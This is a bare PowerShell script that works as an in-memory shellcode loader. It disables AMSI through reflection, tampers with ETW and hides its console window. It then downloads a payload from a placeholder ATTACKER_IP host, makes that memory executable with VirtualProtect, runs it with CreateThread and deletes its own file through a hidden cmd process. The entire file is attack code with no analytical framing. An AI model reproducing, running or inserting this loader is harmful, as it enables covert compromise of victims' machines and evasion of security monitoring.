#region AMSI + ETW Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
$etw = [System.Diagnostics.Eventing.EventProvider]::new([guid]::NewGuid())
$etw.Dispose()
#endregion

#region Hide Window
Add-Type -Name Win32 -Namespace Kernel32 -MemberDefinition '
[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
$hWnd = [Kernel32.Win32]::GetConsoleWindow()
[Kernel32.Win32]::ShowWindow($hWnd, 0)
#endregion

#region Download + Execute Shellcode
$sc = Invoke-WebRequest -Uri "http://ATTACKER_IP/payload.bin" -UseBasicParsing
$buf = [System.Convert]::FromBase64String($sc.Content)
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($buf.Length)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $mem, $buf.Length)
$old = 0
$vp = Add-Type -memberDefinition @"
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
[DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll", CallingConvention=CallingConvention.Cdecl)] public static extern IntPtr memset(IntPtr dest, int c, int count);
"@ -Name "Win32" -Namespace "Stealth" -PassThru

[Stealth.Win32]::VirtualProtect($mem, [uint32]$buf.Length, 0x40, [ref]$old) | Out-Null
[Stealth.Win32]::CreateThread(0,0,$mem,0,0,0) | Out-Null
Start-Sleep -Seconds 3
#endregion

#region Self-Destruct
$path = $MyInvocation.MyCommand.Path
Start-Sleep -Seconds 1
Start-Process "cmd.exe" "/c timeout 2 & del "$path"" -WindowStyle Hidden
#endregion
